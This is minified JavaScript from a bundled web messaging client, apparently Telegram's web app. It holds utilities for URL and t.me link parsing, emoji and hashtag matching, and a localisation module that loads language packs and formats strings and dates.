    i = (a) => Object.keys(a).filter((u) => a[u] !== void 0),
    n = s ? (a) => i(a).filter((u) => !r.has(u)) : i,
    o = typeof t
  return t && e && o === "object" && o === typeof e
    ? n(t).length === n(e).length && n(t).every((a) => Es(t[a], e[a], s))
    : t === e
}
function He(t) {
  return t.charAt(0).toUpperCase() + t.slice(1)
}
const Rr = new Set(["javascript:"])
function vs(t) {
  if (!t) return null
  try {
    const e = new URL(t).protocol
    return Rr.has(e) ? null : e
  } catch {
    return null
  }
}
const Or =
    "((?:👨🏻‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👨🏼‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👨🏽‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👨🏾‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👨🏿‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👩🏻‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👩🏻‍❤️?‍💋‍👩\uD83C[\uDFFB-\uDFFF]|👩🏼‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👩🏼‍❤️?‍💋‍👩\uD83C[\uDFFB-\uDFFF]|👩🏽‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👩🏽‍❤️?‍💋‍👩\uD83C[\uDFFB-\uDFFF]|👩🏾‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👩🏾‍❤️?‍💋‍👩\uD83C[\uDFFB-\uDFFF]|👩🏿‍❤️?‍💋‍👨\uD83C[\uDFFB-\uDFFF]|👩🏿‍❤️?‍💋‍👩\uD83C[\uDFFB-\uDFFF]|🧑🏻‍❤️?‍💋‍🧑\uD83C[\uDFFC-\uDFFF]|🧑🏼‍❤️?‍💋‍🧑\uD83C[\uDFFB\uDFFD-\uDFFF]|🧑🏽‍❤️?‍💋‍🧑\uD83C[\uDFFB\uDFFC\uDFFE\uDFFF]|🧑🏾‍❤️?‍💋‍🧑\uD83C[\uDFFB-\uDFFD\uDFFF]|🧑🏿‍❤️?‍💋‍🧑\uD83C[\uDFFB-\uDFFE]|👨🏻‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👨🏻‍🤝‍👨\uD83C[\uDFFC-\uDFFF]|👨🏼‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👨🏼‍🤝‍👨\uD83C[\uDFFB\uDFFD-\uDFFF]|👨🏽‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👨🏽‍🤝‍👨\uD83C[\uDFFB\uDFFC\uDFFE\uDFFF]|👨🏾‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👨🏾‍🤝‍👨\uD83C[\uDFFB-\uDFFD\uDFFF]|👨🏿‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👨🏿‍🤝‍👨\uD83C[\uDFFB-\uDFFE]|👩🏻‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👩🏻‍❤️?‍👩\uD83C[\uDFFB-\uDFFF]|👩🏻‍🤝‍👨\uD83C[\uDFFC-\uDFFF]|👩🏻‍🤝‍👩\uD83C[\uDFFC-\uDFFF]|👩🏼‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👩🏼‍❤️?‍👩\uD83C[\uDFFB-\uDFFF]|👩🏼‍🤝‍👨\uD83C[\uDFFB\uDFFD-\uDFFF]|👩🏼‍🤝‍👩\uD83C[\uDFFB\uDFFD-\uDFFF]|👩🏽‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👩🏽‍❤️?‍👩\uD83C[\uDFFB-\uDFFF]|👩🏽‍🤝‍👨\uD83C[\uDFFB\uDFFC\uDFFE\uDFFF]|👩🏽‍🤝‍👩\uD83C[\uDFFB\uDFFC\uDFFE\uDFFF]|👩🏾‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👩🏾‍❤️?‍👩\uD83C[\uDFFB-\uDFFF]|👩🏾‍🤝‍👨\uD83C[\uDFFB-\uDFFD\uDFFF]|👩🏾‍🤝‍👩\uD83C[\uDFFB-\uDFFD\uDFFF]|👩🏿‍❤️?‍👨\uD83C[\uDFFB-\uDFFF]|👩🏿‍❤️?‍👩\uD83C[\uDFFB-\uDFFF]|👩🏿‍🤝‍👨\uD83C[\uDFFB-\uDFFE]|👩🏿‍🤝‍👩\uD83C[\uDFFB-\uDFFE]|🧑🏻‍❤️?‍🧑\uD83C[\uDFFC-\uDFFF]|🧑🏻‍🤝‍🧑\uD83C[\uDFFB-\uDFFF]|🧑🏼‍❤️?‍🧑\uD83C[\uDFFB\uDFFD-\uDFFF]|🧑🏼‍🤝‍🧑\uD83C[\uDFFB-\uDFFF]|🧑🏽‍❤️?‍🧑\uD83C[\uDFFB\uDFFC\uDFFE\uDFFF]|🧑🏽‍🤝‍🧑\uD83C[\uDFFB-\uDFFF]|🧑🏾‍❤️?‍🧑\uD83C[\uDFFB-\uDFFD\uDFFF]|🧑🏾‍🤝‍🧑\uD83C[\uDFFB-\uDFFF]|🧑🏿‍❤️?‍🧑\uD83C[\uDFFB-\uDFFE]|🧑🏿‍🤝‍🧑\uD83C[\uDFFB-\uDFFF]|👨‍❤️?‍💋‍👨|👩‍❤️?‍💋‍\uD83D[\uDC68\uDC69]|🫱🏻‍🫲\uD83C[\uDFFC-\uDFFF]|🫱🏼‍🫲\uD83C[\uDFFB\uDFFD-\uDFFF]|🫱🏽‍🫲\uD83C[\uDFFB\uDFFC\uDFFE\uDFFF]|🫱🏾‍🫲\uD83C[\uDFFB-\uDFFD\uDFFF]|🫱🏿‍🫲\uD83C[\uDFFB-\uDFFE]|👨‍❤️?‍👨|👩‍❤️?‍\uD83D[\uDC68\uDC69]|🧑‍🤝‍🧑|👫\uD83C[\uDFFB-\uDFFF]|👬\uD83C[\uDFFB-\uDFFF]|👭\uD83C[\uDFFB-\uDFFF]|💏\uD83C[\uDFFB-\uDFFF]|💑\uD83C[\uDFFB-\uDFFF]|🤝\uD83C[\uDFFB-\uDFFF]|\uD83D[\uDC6B-\uDC6D\uDC8F\uDC91]|🤝)|(?:\uD83D[\uDC68\uDC69]|🧑)(?:\uD83C[\uDFFB-\uDFFF])?‍(?:⚕️?|⚖️?|✈️?|\uD83C[\uDF3E\uDF73\uDF7C\uDF84\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|(?:\uD83C[\uDFCB\uDFCC]|\uD83D[\uDD74\uDD75]|⛹)(?:(?:\uD83C[\uDFFB-\uDFFF]|️?)‍[♀♂]️?)|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC70\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD35\uDD37-\uDD39\uDD3D\uDD3E\uDDB8\uDDB9\uDDCD-\uDDCF\uDDD4\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])?‍[♀♂]️?|(?:👨‍👨‍👦‍👦|👨‍👨‍👧‍\uD83D[\uDC66\uDC67]|👨‍👩‍👦‍👦|👨‍👩‍👧‍\uD83D[\uDC66\uDC67]|👩‍👩‍👦‍👦|👩‍👩‍👧‍\uD83D[\uDC66\uDC67]|👨‍👦‍👦|👨‍👧‍\uD83D[\uDC66\uDC67]|👨‍👨‍\uD83D[\uDC66\uDC67]|👨‍👩‍\uD83D[\uDC66\uDC67]|👩‍👦‍👦|👩‍👧‍\uD83D[\uDC66\uDC67]|👩‍👩‍\uD83D[\uDC66\uDC67]|🏳️?‍⚧️?|🏳️?‍🌈|😶‍🌫️?|❤️?‍🔥|❤️?‍🩹|🏴‍☠️?|🐕‍🦺|🐻‍❄️?|👁‍🗨|👨‍\uD83D[\uDC66\uDC67]|👩‍\uD83D[\uDC66\uDC67]|👯‍♀️?|👯‍♂️?|😮‍💨|😵‍💫|🤼‍♀️?|🤼‍♂️?|🧞‍♀️?|🧞‍♂️?|🧟‍♀️?|🧟‍♂️?|🐈‍⬛)|[#*0-9]️??⃣|(?:[©®™♟]️?)|(?:\uD83C[\uDC04\uDD70\uDD71\uDD7E\uDD7F\uDE02\uDE1A\uDE2F\uDE37\uDF21\uDF24-\uDF2C\uDF36\uDF7D\uDF96\uDF97\uDF99-\uDF9B\uDF9E\uDF9F\uDFCD\uDFCE\uDFD4-\uDFDF\uDFF3\uDFF5\uDFF7]|\uD83D[\uDC3F\uDC41\uDCFD\uDD49\uDD4A\uDD6F\uDD70\uDD73\uDD76-\uDD79\uDD87\uDD8A-\uDD8D\uDDA5\uDDA8\uDDB1\uDDB2\uDDBC\uDDC2-\uDDC4\uDDD1-\uDDD3\uDDDC-\uDDDE\uDDE1\uDDE3\uDDE8\uDDEF\uDDF3\uDDFA\uDECB\uDECD-\uDECF\uDEE0-\uDEE5\uDEE9\uDEF0\uDEF3]|[‼⁉ℹ↔-↙↩↪⌚⌛⌨⏏⏭-⏯⏱⏲⏸-⏺Ⓜ▪▫▶◀◻-◾☀-☄☎☑☔☕☘☠☢☣☦☪☮☯☸-☺♀♂♈-♓♠♣♥♦♨♻♿⚒-⚗⚙⚛⚜⚠⚡⚧⚪⚫⚰⚱⚽⚾⛄⛅⛈⛏⛑⛓⛔⛩⛪⛰-⛵⛸⛺⛽✂✈✉✏✒✔✖✝✡✳✴❄❇❗❣❤➡⤴⤵⬅-⬇⬛⬜⭐⭕〰〽㊗㊙])(?:️?|(?!︎))|(?:(?:\uD83C[\uDFCB\uDFCC]|\uD83D[\uDD74\uDD75\uDD90]|[☝⛷⛹✌✍])(?:️?|(?!︎))|(?:\uD83C[\uDF85\uDFC2-\uDFC4\uDFC7\uDFCA]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66-\uDC69\uDC6E\uDC70-\uDC78\uDC7C\uDC81-\uDC83\uDC85-\uDC87\uDCAA\uDD7A\uDD95\uDD96\uDE45-\uDE47\uDE4B-\uDE4F\uDEA3\uDEB4-\uDEB6\uDEC0\uDECC]|\uD83E[\uDD0C\uDD0F\uDD18-\uDD1C\uDD1E\uDD1F\uDD26\uDD30-\uDD39\uDD3D\uDD3E\uDD77\uDDB5\uDDB6\uDDB8\uDDB9\uDDBB\uDDCD-\uDDCF\uDDD1-\uDDDD\uDEC3-\uDEC5\uDEF0-\uDEF6]|[✊✋]))(?:\uD83C[\uDFFB-\uDFFF])?|(?:🏴󠁧󠁢󠁥󠁮󠁧󠁿|🏴󠁧󠁢󠁳󠁣󠁴󠁿|🏴󠁧󠁢󠁷󠁬󠁳󠁿|🇦\uD83C[\uDDE8-\uDDEC\uDDEE\uDDF1\uDDF2\uDDF4\uDDF6-\uDDFA\uDDFC\uDDFD\uDDFF]|🇧\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEF\uDDF1-\uDDF4\uDDF6-\uDDF9\uDDFB\uDDFC\uDDFE\uDDFF]|🇨\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDEE\uDDF0-\uDDF5\uDDF7\uDDFA-\uDDFF]|🇩\uD83C[\uDDEA\uDDEC\uDDEF\uDDF0\uDDF2\uDDF4\uDDFF]|🇪\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDED\uDDF7-\uDDFA]|🇫\uD83C[\uDDEE-\uDDF0\uDDF2\uDDF4\uDDF7]|🇬\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEE\uDDF1-\uDDF3\uDDF5-\uDDFA\uDDFC\uDDFE]|🇭\uD83C[\uDDF0\uDDF2\uDDF3\uDDF7\uDDF9\uDDFA]|🇮\uD83C[\uDDE8-\uDDEA\uDDF1-\uDDF4\uDDF6-\uDDF9]|🇯\uD83C[\uDDEA\uDDF2\uDDF4\uDDF5]|🇰\uD83C[\uDDEA\uDDEC-\uDDEE\uDDF2\uDDF3\uDDF5\uDDF7\uDDFC\uDDFE\uDDFF]|🇱\uD83C[\uDDE6-\uDDE8\uDDEE\uDDF0\uDDF7-\uDDFB\uDDFE]|🇲\uD83C[\uDDE6\uDDE8-\uDDED\uDDF0-\uDDFF]|🇳\uD83C[\uDDE6\uDDE8\uDDEA-\uDDEC\uDDEE\uDDF1\uDDF4\uDDF5\uDDF7\uDDFA\uDDFF]|🇴🇲|🇵\uD83C[\uDDE6\uDDEA-\uDDED\uDDF0-\uDDF3\uDDF7-\uDDF9\uDDFC\uDDFE]|🇶🇦|🇷\uD83C[\uDDEA\uDDF4\uDDF8\uDDFA\uDDFC]|🇸\uD83C[\uDDE6-\uDDEA\uDDEC-\uDDF4\uDDF7-\uDDF9\uDDFB\uDDFD-\uDDFF]|🇹\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDED\uDDEF-\uDDF4\uDDF7\uDDF9\uDDFB\uDDFC\uDDFF]|🇺\uD83C[\uDDE6\uDDEC\uDDF2\uDDF3\uDDF8\uDDFE\uDDFF]|🇻\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDEE\uDDF3\uDDFA]|🇼\uD83C[\uDDEB\uDDF8]|🇽🇰|🇾\uD83C[\uDDEA\uDDF9]|🇿\uD83C[\uDDE6\uDDF2\uDDFC]|\uD83C[\uDCCF\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE32-\uDE36\uDE38-\uDE3A\uDE50\uDE51\uDF00-\uDF20\uDF2D-\uDF35\uDF37-\uDF7C\uDF7E-\uDF84\uDF86-\uDF93\uDFA0-\uDFC1\uDFC5\uDFC6\uDFC8\uDFC9\uDFCF-\uDFD3\uDFE0-\uDFF0\uDFF4\uDFF8-\uDFFF]|\uD83D[\uDC00-\uDC3E\uDC40\uDC44\uDC45\uDC51-\uDC65\uDC6A\uDC6F\uDC79-\uDC7B\uDC7D-\uDC80\uDC84\uDC88-\uDC8E\uDC90\uDC92-\uDCA9\uDCAB-\uDCFC\uDCFF-\uDD3D\uDD4B-\uDD4E\uDD50-\uDD67\uDDA4\uDDFB-\uDE44\uDE48-\uDE4A\uDE80-\uDEA2\uDEA4-\uDEB3\uDEB7-\uDEBF\uDEC1-\uDEC5\uDED0-\uDED2\uDED5-\uDED7\uDEDD-\uDEDF\uDEEB\uDEEC\uDEF4-\uDEFC\uDFE0-\uDFEB\uDFF0]|\uD83E[\uDD0D\uDD0E\uDD10-\uDD17\uDD20-\uDD25\uDD27-\uDD2F\uDD3A\uDD3C\uDD3F-\uDD45\uDD47-\uDD76\uDD78-\uDDB4\uDDB7\uDDBA\uDDBC-\uDDCC\uDDD0\uDDDE-\uDDFF\uDE70-\uDE74\uDE78-\uDE7C\uDE80-\uDE86\uDE90-\uDEAC\uDEB0-\uDEBA\uDEC0-\uDEC2\uDED0-\uDED9\uDEE0-\uDEE7]|[⏩-⏬⏰⏳♾⛎✅✨❌❎❓-❕➕-➗➰➿])|️)",
  ve =
    "a-z\\u00c0-\\u00d6\\u00d8-\\u00f6\\u00f8-\\u00ff\\u0100-\\u024f\\u0253\\u0254\\u0256\\u0257\\u0259\\u025b\\u0263\\u0268\\u026f\\u0272\\u0289\\u028b\\u02bb\\u0300-\\u036f\\u1e00-\\u1eff\\u0400-\\u04ff\\u0500-\\u0527\\u2de0-\\u2dff\\ua640-\\ua69f\\u0591-\\u05bf\\u05c1-\\u05c2\\u05c4-\\u05c5\\u05c7\\u05d0-\\u05ea\\u05f0-\\u05f4\\ufb1d-\\ufb28\\ufb2a-\\ufb36\\ufb38-\\ufb3c\\ufb3e\\ufb40-\\ufb41\\ufb43-\\ufb44\\ufb46-\\ufb4f\\u0610-\\u061a\\u0620-\\u065f\\u066e-\\u06d3\\u06d5-\\u06dc\\u06de-\\u06e8\\u06ea-\\u06ef\\u06fa-\\u06fc\\u06ff\\u0750-\\u077f\\u08a0\\u08a2-\\u08ac\\u08e4-\\u08fe\\ufb50-\\ufbb1\\ufbd3-\\ufd3d\\ufd50-\\ufd8f\\ufd92-\\ufdc7\\ufdf0-\\ufdfb\\ufe70-\\ufe74\\ufe76-\\ufefc\\u200c\\u0e01-\\u0e3a\\u0e40-\\u0e4e\\u1100-\\u11ff\\u3130-\\u3185\\uA960-\\uA97F\\uAC00-\\uD7AF\\uD7B0-\\uD7FF\\u3003\\u3005\\u303b\\uff21-\\uff3a\\uff41-\\uff5a\\uff66-\\uff9f\\uffa1-\\uffdc",
  Br = "0-9_" + ve,
  jt = "·",
  ke = "[" + ve + "0-9]",
  xr = "((?:https?|ftp)://|mailto:)?",
  Nr =
    xr +
    "(?:" +
    ke +
    "{1,64}(?::" +
    ke +
    "{0,64})?@)?(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])(?:\\.(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])){3}|" +
    ke +
    "[" +
    ve +
    jt +
    "0-9-]{0,64}(?:\\." +
    ke +
    "[" +
    ve +
    jt +
    "0-9-]{0,64}){0,10}(?:\\.(xn--[0-9a-z]{2,16}|[" +
    ve +
    `]{2,24})))(?::\\d{2,5})?(?:/(?:\\S{0,255}[^\\s.;,(\\[\\]{}<>"'])?)?`,
  ys = "[a-zA-Z\\d_]{5,32}",
  Wr = "(?:\\s|^)((?:\\d{1,2}:)?(?:[0-5]?[0-9]):(?:[0-5][0-9]))(?:\\s|$)",
  Ur = "\\/([a-zA-Z\\d_]{1,32})(?:@(" + ys + "))?(\\b|$)",
  Yn = new RegExp(
    "(^| )(@)(" +
      ys +
      ")|(" +
      Nr +
      ")|(\\n)|(" +
      Or +
      ")|(^|[\\s\\(\\]])(#[" +
      Br +
      "]{2,64})|(^|\\s)" +
      Ur +
      "|" +
      Wr,
    "i"
  ),
  Hn =
    /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
  $n = {
    Telegram: "tg://search_hashtag?hashtag={1}",
    Twitter: "https://twitter.com/hashtag/{1}",
    Instagram: "https://instagram.com/explore/tags/{1}/",
    "Google Plus": "https://plus.google.com/explore/{1}",
  },
  mt = {
    "`": "messageEntityCode",
    "``": "messageEntityPre",
    "**": "messageEntityBold",
    __: "messageEntityItalic",
    "~~": "messageEntityStrike",
    "_-_": "messageEntityUnderline",
    "||": "messageEntitySpoiler",
  }
new Set(Object.values(mt))
const Ss = new Set([
    "messageEntityEmoji",
    "messageEntityLinebreak",
    "messageEntityCaret",
  ]),
  qn = new Set(Ss)
for (const t in mt) Ss.add(mt[t])
const Vr = /^\+\d+$/
function _s(t, e) {
  vs(t) || (t = "https://" + t)
  const s = { url: t }
  let r, i, n
  if (
    (r = t.match(
      /^(?:https?:\/\/)?(?:(.+?)\.)?(?:(?:web|k|z|a)\.)?t(?:elegram)?\.me(?:\/(.+))?/
    ))
  ) {
    const o = new URL(t)
    let c = r[1]
    c && Dr.has(r[1]) && (c = void 0),
      c && (o.pathname = c + (o.pathname === "/" ? "" : o.pathname))
    const a = o.pathname.slice(1),
      u = a.split("/")
    if (u[0] && u[0][0] === "$" && u[0].length > 1) n = "invoice"
    else if (/^\+/.test(a) && !Vr.test(a)) n = "joinchat"
    else if (u[0])
      switch (u[0]) {
        case "addlist":
        case "joinchat":
        case "addstickers":
        case "addemoji":
        case "voicechat":
        case "invoice":
        case "boost":
        case "giftcode":
          if (u.length !== 1 && !c) {
            n = u[0]
            break
          }
        default:
          if (
            u.length <= 2 ||
            u[1]?.match(/^\d+(?:\?(?:comment|thread)=\d+)?$/) ||
            u[1] === "s"
          ) {
            n = "im"
            break
          }
          break
      }
  } else
    t.match(/^(?:https?:\/\/)?telesco\.pe\/([^/?]+)\/(\d+)/)
      ? (n = "im")
      : (i = t.match(/tg:(?:\/\/)?(.+?)(?:\?|$)/)) && (n = "tg_" + i[1])
  return window[n] || (n = void 0), (s.onclick = n), s
}
S && (S.wrapUrl = _s)
function Kn(t, e) {
  ws(t),
    e === void 0
      ? t.replaceChildren()
      : typeof e == "string"
      ? e
        ? (t.textContent = e)
        : t.replaceChildren()
      : t.replaceChildren(e)
}
function ws(t) {
  t.setAttribute("dir", "auto")
}
var ie
;((t) => {
  ;(t.strings = new Map()), (t.countriesList = [])
  let e, s
  ;(t.requestedServerLanguage = !1), (t.isRTL = !1)
  function r(l) {
    t.isRTL = l
  }
  t.setRTL = r
  function i(l) {
    ;(t.lastRequestedLangCode = l),
      (t.lastRequestedNormalizedLangCode = l.split("-")[0])
  }
  function n() {
    return (
      s ||
      (s = Promise.all([ce.get("langPack"), t.polyfillPromise])
        .then(([l]) =>
          l ? (t.lastRequestedLangCode || i(l.lang_code), w(l), l) : a()
        )
        .finally(() => {
          s = void 0
        }))
    )
  }
  t.getCacheLangPack = n
  function o() {
    if (t.timeFormat === "h12")
      try {
        const l = L({ hour: "numeric", minute: "numeric", hour12: !0 }),
          f = new Date()
        f.setHours(0)
        const p = l.format(f)
        ;(t.amPmCache.am = p.split(/\s/)[1]), f.setHours(12)
        const d = l.format(f)
        t.amPmCache.pm = d.split(/\s/)[1]
      } catch (l) {
        console.error("cannot get am/pm", l),
          (t.amPmCache = { am: "AM", pm: "PM" })
      }
  }
  function c(l, f = !!t.timeFormat && t.timeFormat !== l) {
    ;(t.timeFormat = l),
      o(),
      f &&
        (T.clear(),
        Array.from(document.querySelectorAll(".i18n")).forEach((d) => {
          const A = t.weakMap.get(d)
          A instanceof y && A.update()
        }))
  }
  t.setTimeFormat = c
  function a() {
    const l = B.langPackCode
    return (
      i(l),
      Promise.all([
        W(() => import("./lang-e741adfd.js"), [], import.meta.url),
        W(() => import("./langSign-66e8939d.js"), [], import.meta.url),
        W(() => import("./countries-5301fc59.js"), [], import.meta.url),
      ]).then(([f, p, d]) => {
        const A = []
        m(f.default, A), m(p.default, A)
        const j = {
          _: "langPackDifference",
          from_version: 0,
          lang_code: l,
          strings: A,
          version: 0,
          local: !0,
          countries: d.default,
        }
        return D(j)
      })
    )
  }
  t.loadLocalLangPack = a
  function u(l, f) {
    ;(f = !0), (t.requestedServerLanguage = !0)
    const p = F.managers
    return Promise.all([
      p.apiManager.invokeApiCacheable("langpack.getLangPack", {
        lang_code: l,
        lang_pack: f ? "web" : B.langPack,
      }),
      !f &&
        p.apiManager.invokeApiCacheable("langpack.getLangPack", {
          lang_code: l,
          lang_pack: "android",
        }),
      W(() => import("./lang-e741adfd.js"), [], import.meta.url),
      W(() => import("./langSign-66e8939d.js"), [], import.meta.url),
      p.apiManager.invokeApiCacheable("help.getCountriesList", {
        lang_code: l,
        hash: 0,
      }),
      t.polyfillPromise,
    ])
  }
  t.loadLangPack = u
  function h(l, f) {
    return F.managers.apiManager.invokeApi("langpack.getStrings", {
      lang_pack: B.langPack,
      lang_code: l,
      keys: f,
    })
  }
  t.getStrings = h
  function m(l, f = []) {
    for (const p in l) {
      const d = l[p]
      typeof d == "string"
        ? f.push({ _: "langPackString", key: p, value: d })
        : f.push({ _: "langPackStringPluralized", key: p, ...d })
    }
    return f
  }
  t.formatLocalStrings = m
  function v(l, f) {
    return (
      i(l),
      u(l, f).then(([p, d, A, j, z, de]) => {
        let oe = []
        return (
          [A, j].forEach((Xe) => {
            m(Xe.default, oe)
          }),
          (oe = oe.concat(...[p.strings, d.strings].filter(Boolean))),
          (p.strings = oe),
          (p.countries = z),
          D(p)
        )
      })
    )
  }
  t.getLangPack = v
  function D(l) {
    return (
      (l.appVersion = B.langPackVersion),
      ce.set({ langPack: l }).then(() => (w(l), l))
    )
  }
  ;(t.saveLangPack = D),
    (t.polyfillPromise = (function () {
      return typeof Intl < "u" && typeof Intl.PluralRules < "u"
        ? Promise.resolve()
        : W(
            () => import("./pluralPolyfill-61f068d6.js"),
            [],
            import.meta.url
          ).then((f) => {
            window.Intl = Object.assign(
              typeof Intl < "u" ? Intl : {},
              f.default
            )
          })
    })())
  function w(l) {
    const f = t.lastRequestedLangCode
    if (l.lang_code !== f) return
    try {
      e = new Intl.PluralRules(t.lastRequestedNormalizedLangCode)
    } catch (d) {
      console.error("pluralRules error", d),
        (e = new Intl.PluralRules(
          t.lastRequestedNormalizedLangCode.split("-", 1)[0]
        ))
    }
    try {
      e = new Intl.PluralRules(l.lang_code)
    } catch (d) {
      console.error("pluralRules error", d),
        (e = new Intl.PluralRules(l.lang_code.split("-", 1)[0]))
    }
    t.strings.clear()
    for (const d of l.strings) t.strings.set(d.key, d)
    l.countries &&
      ((t.countriesList.length = 0),
      t.countriesList.push(...l.countries.countries),
      l.countries.countries.forEach((d) => {
        if (d.name) {
          const A = d.default_name
          t.strings.set(A, { _: "langPackString", key: A, value: d.name })
        }
      })),
      t.lastAppliedLangCode !== f &&
        (t.lastAppliedLangCode &&
          F.myId &&
          (F.managers.appReactionsManager.resetAvailableReactions(),
          F.managers.appUsersManager.indexMyself(),
          F.managers.dialogsStorage.indexMyDialog()),
        (t.lastAppliedLangCode = f),
        T.clear(),
        o(),
        F.dispatchEvent("language_change", f)),
      Array.from(document.querySelectorAll(".i18n")).forEach((d) => {
        const A = t.weakMap.get(d)
        A && A.update()
      })
  }
  t.applyLangPack = w
  function b(l, f, p) {
    const d = f[p.i++]
    Array.isArray(d) ? l.push(...d) : l.push(d)
  }
  function g(l, f, p = { i: 0 }) {
    const d = [],
      A = /(\*\*|__)(.+?)\1|(\n)|(\[.+?\]\(.*?\))|un\d|%\d\$.|%./g
    let j = 0
    return (
      l.replace(A, (z, de, oe, Xe, fe, It, rr) => {
        if ((d.push(rr.slice(j, It)), de)) {
          let Z
          switch (de) {
            case "**": {
              Z = document.createElement("b")
              break
            }
            case "__": {
              Z = document.createElement("i")
              break
            }
          }
          Z.append(...g(oe, f, p)), d.push(Z)
        } else if (Xe) d.push(document.createElement("br"))
        else if (fe) {
          const Z = fe.lastIndexOf("]"),
            ir = fe.slice(1, Z),
            Je = fe.slice(Z + 2, fe.length - 1)
          let U
          if (Je && vs(Je)) {
            U = document.createElement("a")
            const Ze = _s(Je)
            ;(U.href = Ze.url),
              Ze.onclick && U.setAttribute("onclick", Ze.onclick + "(this)"),
              (U.target = "_blank")
          } else
            (U = f[p.i++]),
              U instanceof DocumentFragment && (U = U.firstChild),
              typeof U != "string" && (U.textContent = "")
          const Rt = g(ir, f, p)
          typeof U == "string" ? d.push(...Rt) : (U.append(...Rt), d.push(U))
        } else f && b(d, f, p)
        return (j = It + z.length), ""
      }),
      j !== l.length && d.push(l.slice(j)),
      d
    )
  }
  t.superFormatter = g
  function E(l, f = !1, p) {
    const d = t.strings.get(l)
    let A
    if (d)
      if (d._ === "langPackStringPluralized" && p?.length) {
        let z = p[0]
        typeof z == "string" && (z = +z.replace(/\D/g, ""))
        const de = e.select(z)
        A = d[de + "_value"] || d.other_value
      } else d._ === "langPackString" ? (A = d.value) : (A = l)
    else A = l
    const j = g(A, p)
    return f
      ? j.map((z) => (z instanceof Node ? z.textContent : z)).join("")
      : j
  }
  ;(t.format = E), (t.weakMap = new WeakMap())
  class k {
    constructor(f) {
      ;(this.element = f?.element || document.createElement("span")),
        this.element.classList.add("i18n"),
        (this.property = f?.property),
        t.weakMap.set(this.element, this)
    }
  }
  class P extends k {
    constructor(f = {}) {
      super({ ...f, property: f.property ?? "innerHTML" }),
        f?.key && this.update(f)
    }
    update(f) {
      if ((gt(this, f), this.property === "innerHTML"))
        this.element.replaceChildren(...E(this.key, !1, this.args)),
          this.args?.length && this.element.normalize()
      else {
        const p = this.element[this.property],
          d = E(this.key, !0, this.args)
        p === void 0
          ? (this.element.dataset[this.property] = d)
          : (this.element[this.property] = d)
      }
    }
    compareAndUpdate(f) {
      if (!(this.key === f.key && Es(this.args, f.args))) return this.update(f)
    }
  }
  t.IntlElement = P
  const T = new Map()
  function L(l = {}) {
    const f = JSON.stringify(l)
    let p = T.get(f)
    return (
      p ||
        ((p = new Intl.DateTimeFormat(
          t.lastRequestedNormalizedLangCode + "-u-hc-" + t.timeFormat,
          l
        )),
        T.set(f, p)),
      p
    )
  }
  ;(t.getDateTimeFormat = L), (t.amPmCache = { am: "AM", pm: "PM" })
  class y extends k {
    constructor(f) {
      super({ ...f, property: f.property ?? "textContent" }),
        ws(this.element),
        f?.date && this.update(f)
    }
    update(f) {
      gt(this, f)
      let p
      if (
        this.options.hour &&
        this.options.minute &&
        Object.keys(this.options).length === 2
      ) {
        const d = this.date.getHours()
        ;(p =
          ("0" + (t.timeFormat === "h12" ? d % 12 || 12 : d)).slice(-2) +
          ":" +
          ("0" + this.date.getMinutes()).slice(-2)),
          t.timeFormat === "h12" &&
            (p += " " + (d < 12 ? t.amPmCache.am : t.amPmCache.pm))
      } else {
        const d = L(this.options)
        p = He(d.format(this.date))
      }
      this.element[this.property] = p
    }
  }
  t.IntlDateElement = y
  function M(l, f) {
    return new P({ key: l, args: f }).element
  }
  t.i18n = M
  function I(l) {
    return new P(l).element
  }
  t.i18n_ = I
  function _(l, f, p, d) {
    return new P({ element: l, key: f, args: p, property: d }).element
  }
  t._i18n = _
})(ie || (ie = {}))
const G = ie,
  Xn = ie.i18n
ie.i18n_
const Jn = ie._i18n
S && (S.I18n = ie)
function zr(t) {
  return +t < 0
}
function jr(t) {
  return +t >= 0
}
String.prototype.toUserId = function () {
  return (+this).toUserId()
}
String.prototype.toChatId = function () {
  return (+this).toChatId()
}
String.prototype.toPeerId = function (t) {
  return (+this).toPeerId(t)
}
String.prototype.isPeerId = function () {
  return /^[\d-]/.test(this.toString())
}
